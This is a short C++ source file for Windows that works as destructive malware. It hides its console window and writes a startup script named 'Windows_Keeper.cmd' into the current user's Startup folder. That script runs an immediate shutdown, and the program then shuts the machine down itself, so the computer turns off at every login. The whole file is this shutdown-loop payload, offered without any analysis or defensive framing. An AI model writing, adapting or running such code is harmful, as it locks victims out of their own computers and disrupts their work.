#include <iostream>
#include <fstream>
#include <windows.h>
#include <Lmcons.h>
#include <atlstr.h>
using namespace std;

#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
int main()
{
    //Get Windows UserName
    TCHAR name[60];
    DWORD size = sizeof(name) / sizeof(name[0]);
    GetUserName(name, &size);
  
    //Convert LPWSTR to string
    wstring ws(name);
    string s = string(ws.begin(), ws.end());

    //Put Loop-restart file in start menu
    ofstream newFile;  
    newFile.open("C:/Users/" + s + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Windows_Keeper.cmd");
    newFile << "shutdown -s -t 0";   
    newFile.close(); 
    
    //Result
    MessageBox(NULL, (L"Success!") , (L"Result"), MB_OK);

    system("shutdown -s -t 0");
    return 0;
}




